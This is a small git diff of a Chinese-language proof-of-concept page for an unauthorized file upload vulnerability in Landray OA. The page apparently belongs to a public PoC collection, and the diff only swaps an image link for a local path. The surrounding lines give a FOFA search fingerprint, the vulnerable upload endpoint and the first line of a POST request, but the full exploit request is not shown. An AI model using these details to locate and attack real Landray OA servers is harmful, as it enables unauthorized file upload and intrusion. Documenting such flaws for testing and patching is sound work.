@@ -9,7 +9,7 @@ app="Landray-OA系统"
 
 ## poc
 直接访问路径，发现未授权文件上传 http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
-![c9857f5370d4abd1547fa7cb1988a18a](https://github.com/wy876/POC/assets/139549762/ee361dae-cfa2-4eae-910f-501331731347)
+![c9857f5370d4abd1547fa7cb1988a18a](../../images/ee361dae-cfa2-4eae-910f-501331731347.png)
 
 ```
 POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
